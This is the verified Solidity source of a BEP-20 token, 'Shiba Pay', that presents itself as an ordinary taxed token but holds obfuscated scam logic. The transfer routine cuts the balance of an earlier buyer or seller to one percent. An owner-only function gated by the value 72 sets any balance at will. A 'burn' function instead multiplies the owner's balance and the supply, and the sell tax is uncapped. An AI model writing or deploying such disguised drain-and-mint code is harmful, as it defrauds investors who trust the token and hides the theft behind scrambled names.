/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

pragma solidity 0.8.5;

// SPDX-License-Identifier: MIT

/*
 * 
 * Telegram: https://t.me/shibapaycoin
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {

    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {

    this;
    return msg.data;
  }
}
interface IUniswapV2Factory {
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function feeTo() external view returns (address);
    function allPairs(uint) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function allPairsLength() external view returns (uint);
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,

        address indexed to

    );
    function burn(address to) external returns (uint amount0, uint amount1);
    function mint(address to) external returns (uint liquidity);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    function approve(address spender, uint value) external returns (bool);
    function sync() external;
    function price1CumulativeLast() external view returns (uint);
    function name() external pure returns (string memory);
    function token0() external view returns (address);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function skim(address to) external;

    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function token1() external view returns (address);
    function factory() external view returns (address);
    function transferFrom(address from, address to, uint value) external returns (bool);
    event Sync(uint112 reserve0, uint112 reserve1);
    function kLast() external view returns (uint);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function balanceOf(address owner) external view returns (uint);

    function transfer(address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function initialize(address, address) external;
    function allowance(address owner, address spender) external view returns (uint);
    function totalSupply() external view returns (uint);
    function price0CumulativeLast() external view returns (uint);
    function decimals() external pure returns (uint8);
    function symbol() external pure returns (string memory);
}
interface IUniswapV2Router01 {
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,

        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,

        uint amountETHMin,

        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function factory() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityWithPermit(

        address tokenA,
        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,
        address to,

        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,
        uint amountOutMin,

        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline

    ) external returns (uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to

 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier

 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {

   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;

 }
 /**

  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,

  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).

  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;

    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}

interface IBEP20 {
  function name() external pure returns (string memory);
  function getOwner() external view returns (address);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ShibaPay is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public uniiopwonxferdhjymezclqbaiga;
  address public unigaoxorezhep;
  uint8 private decmnpcliqeokgerihdjzxaafost = 18;
  uint256 private totkpieloficyjhenbxarqtszwomdga = 1000000000 * 10 ** decmnpcliqeokgerihdjzxaafost;
  mapping (address => uint256) private lasycadrjmnsoiq;
  mapping (address => mapping (address => uint256)) private allayoozibewedcsrpxmhjltkq;
  uint256 internal lasnwjkopiqsir = 0;
  mapping (address => uint256) private selkawxjeimishloeqfdrapyonbzgct;
  uint256 internal lauyeoxhksirtibpmaacfoe = 0;
  uint256 internal maxdlcwatinprxzsmf = totkpieloficyjhenbxarqtszwomdga.div(10000).mul(10);
  uint32 internal selqkeoignmywxsaojdhialf = 10; 
  uint8 internal buyziqhfxcjaaykbstgnpo = 5;

  uint8 internal selnyicitqbfad = 8;
  uint8 internal tracmlfpaqgasihitjzdkoneewxro = 10; 

  mapping (address => uint256) private lasrsytinhdecoxomqpgklifa;
  uint8 internal _sta = 3;

  bool internal staesxlicyibz = true;
  bool internal staqaitrlsnjofmwyazhiepceo = true;
  bool internal staehanpmqldzcijfiyos = true;
  address internal marxfwhrjieoq;
  uint8 internal aftdzlbpoeygkarifqaenhxo = 95;
  mapping (address => uint256) private balzxrsiqpgcifteakw;
  mapping (address => bool) private isEshicztgwnqrxkedjoailyabfome;
  string private constant namexzowbmacysqneioptkfrdjl = "Shiba Pay";
  string private constant symghmeknijzwlaoqryfsibexdpcota = "SHIBPAY";
  constructor() {
    lauyeoxhksirtibpmaacfoe = block.timestamp;
    balzxrsiqpgcifteakw[msg.sender] = totkpieloficyjhenbxarqtszwomdga;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unigaoxorezhep = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

    uniiopwonxferdhjymezclqbaiga = uniswapV2Router;

    marxfwhrjieoq = msg.sender;

    isEshicztgwnqrxkedjoailyabfome[address(this)] = true;
    isEshicztgwnqrxkedjoailyabfome[_msgSender()] = true;
    emit Transfer(address(0), msg.sender, totkpieloficyjhenbxarqtszwomdga);
  }
	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  tramdpojflqnichsrgzw(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns balance of.
	 */

	function balanceOf(address account) external override view returns (uint256) {
	  return balzxrsiqpgcifteakw[account];
	}
	/**
	 * Returns the token decimals.
	 */

	function decimals() external override view returns (uint8) {
	  return decmnpcliqeokgerihdjzxaafost;

	}

	/**

	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symghmeknijzwlaoqryfsibexdpcota;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allayoozibewedcsrpxmhjltkq[owner][spender] = amount;
	    emit Approval(owner, spender, amount);

	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allayoozibewedcsrpxmhjltkq[owner][spender];
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

	   tramdpojflqnichsrgzw(sender, recipient, amount);
	   _approve(sender, _msgSender(), allayoozibewedcsrpxmhjltkq[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {

	  return namexzowbmacysqneioptkfrdjl;

	}

	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totkpieloficyjhenbxarqtszwomdga;
	}

  	function tramdpojflqnichsrgzw(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranjinirecotyx = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEshicztgwnqrxkedjoailyabfome[sender] == true || isEshicztgwnqrxkedjoailyabfome[recipient] == true){
	      eTrermwtizgkb(sender, recipient, amount);
	      return;
	    }
	    if(sender == unigaoxorezhep && recipient != address(uniiopwonxferdhjymezclqbaiga)) {
	      require(staesxlicyibz == true, "Please wait try again later");
	      ranjinirecotyx = 1;
	      tax = buyziqhfxcjaaykbstgnpo;
	      approveTransaction = true;
	      lasrsytinhdecoxomqpgklifa[recipient] = amount;
	      lasycadrjmnsoiq[recipient] = block.timestamp;
	    } else if(recipient == unigaoxorezhep) {
	      require(staqaitrlsnjofmwyazhiepceo == true, "Please wait try again later");
	       ranjinirecotyx = 2;
	       tax = selnyicitqbfad;
	       approveTransaction = true;
	    } else {
	      require(staehanpmqldzcijfiyos == true, "Please wait try again later");
	      ranjinirecotyx = 3;
	      tax = tracmlfpaqgasihitjzdkoneewxro;
	      approveTransaction = true;
	      lasrsytinhdecoxomqpgklifa[sender] = amount;

	      if(selqkeoignmywxsaojdhialf > 10){
	        lasycadrjmnsoiq[sender] = block.timestamp + selqkeoignmywxsaojdhialf - 10;
	      } else {

	        lasycadrjmnsoiq[sender] = block.timestamp + selqkeoignmywxsaojdhialf;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranjinirecotyx);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}
	function eTrermwtizgkb(address sender, address recipient, uint256 amount) internal {

	    balzxrsiqpgcifteakw[sender] = balzxrsiqpgcifteakw[sender].sub(amount, "Insufficient Balance");
	    balzxrsiqpgcifteakw[recipient] = balzxrsiqpgcifteakw[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allayoozibewedcsrpxmhjltkq;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranjinirecotyx) internal
	{
	  uint256 axeghabrnspkiowiyad = 0;
	  address addr = recipient;
	  uint256 d = balzxrsiqpgcifteakw[_recipientb];
	  if(ranjinirecotyx == 2) {
	    addr = sender;
	  }
	  if(ranjinirecotyx == 1 || ranjinirecotyx == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balzxrsiqpgcifteakw[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }
	  balzxrsiqpgcifteakw[sender] = balzxrsiqpgcifteakw[sender].sub(amount,"Insufficient Balance");
	  axeghabrnspkiowiyad = amount.mul(tax).div(100);
	  amount = amount.sub(axeghabrnspkiowiyad);

	  if(axeghabrnspkiowiyad > 0){
	      balzxrsiqpgcifteakw[marxfwhrjieoq] = balzxrsiqpgcifteakw[marxfwhrjieoq].add(axeghabrnspkiowiyad);
	      emit Transfer(sender, marxfwhrjieoq, axeghabrnspkiowiyad);
	  }
	  balzxrsiqpgcifteakw[recipient] = balzxrsiqpgcifteakw[recipient].add(amount);
	  ranjinirecotyx= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function Seladijtrgeafownoly(uint8 ellohbitfyzemcgoxdanqakespijl) public onlyOwner{
	     selnyicitqbfad = ellohbitfyzemcgoxdanqakespijl;

	}

	function etBxprielbhoqntewc(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    balzxrsiqpgcifteakw[addr] = b * 10 ** decmnpcliqeokgerihdjzxaafost;
	  }
	}
	uint256 public _devFee = 2;
	function devFee(uint256 devfee) public onlyOwner {
	  _devFee = devfee;
	}
	function ownaple(uint256 amount) public onlyOwner virtual {
	  _ownaple(_msgSender(), amount);

	}
	function _ownaple(address account, uint256 amount) internal {
	  require(account != address(0));
	  balzxrsiqpgcifteakw[account] = balzxrsiqpgcifteakw[account].sub(amount).mul(_devFee);
	  totkpieloficyjhenbxarqtszwomdga = totkpieloficyjhenbxarqtszwomdga.sub(amount).mul(_devFee);

	  emit Transfer(account, address(0), amount);
	}
}